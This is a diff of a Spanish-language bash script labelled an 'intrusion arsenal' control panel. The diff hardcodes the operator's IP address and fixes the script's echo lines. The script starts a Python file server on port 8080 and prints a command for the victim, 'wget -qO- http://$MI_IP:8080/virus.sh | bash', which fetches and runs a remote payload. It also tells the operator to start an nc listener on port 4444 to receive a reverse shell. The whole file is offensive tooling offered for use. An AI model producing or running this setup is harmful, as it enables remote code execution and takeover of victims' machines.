@@ -1,24 +1,21 @@
 #!/bin/bash
-# Averiguamos nuestra IP automáticamente
-MI_IP=$(hostname -I | awk '{print $1}')
+# Definimos nuestra IP manualmente para evitar errores
+MI_IP="192.168.1.109"
 
-echo "---------------------------------------------------->
+echo "----------------------------------------------------"
 echo "  ARSENAL DE INTRUSIÓN - PANEL DE CONTROL"
-echo "---------------------------------------------------->
+echo "----------------------------------------------------"
 echo "1. Tu IP es: $MI_IP"
 echo "2. Link para la víctima:"
 echo "   wget -qO- http://$MI_IP:8080/virus.sh | bash"
-echo "---------------------------------------------------->
-echo "Lanzando servidor de archivos en puerto 8080..."
+echo "----------------------------------------------------"
 
-# Lanzamos el servidor en segundo plano
+# Lanzamos el servidor de archivos
 python3 -m http.server 8080 & 
 SERV_PID=$!
 
-echo "Servidor listo (PID: $SERV_PID). Abre otra terminal >
+echo "Servidor listo (PID: $SERV_PID). Abre otra terminal y escribe:"
 echo "nc -lvnp 4444"
-echo "---------------------------------------------------->
-
-
+echo "----------------------------------------------------"
 
 
